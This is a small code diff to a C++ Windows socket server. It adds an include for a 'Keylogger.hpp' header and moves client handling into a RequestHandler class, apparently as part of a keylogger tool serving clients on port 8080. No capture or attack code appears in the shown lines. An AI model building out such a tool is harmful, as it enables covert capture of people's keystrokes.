@@ -6,15 +6,11 @@
 #include <string>
 #include <cstdint>
 
-struct PacketHeader {
-    uint16_t request_id;
-    uint8_t  request_type;
-    uint8_t  request_key;
-};
+#include "Keylogger.hpp"
+#include "RequestHandler.hpp"
 
 int main(int argc, char *argv[])
 {
-
     WORD wVersionRequested = MAKEWORD(2, 2);
     WSADATA wsaData;
 
@@ -59,6 +55,7 @@ int main(int argc, char *argv[])
     }
     std::cout << "Server is listening on port 8080..." << std::endl;
 
+    RequestHandler requestHandler;
 
     std::vector<HANDLE> clients;
     int idx = 0;
@@ -74,7 +71,7 @@ int main(int argc, char *argv[])
         HANDLE client_thread = CreateThread(
             nullptr,
             0,
-            ProcessClient,
+            LPTHREAD_START_ROUTINE(requestHandler.ProcessClient),
             reinterpret_cast<LPVOID>(clientSocket),
             0,
             nullptr
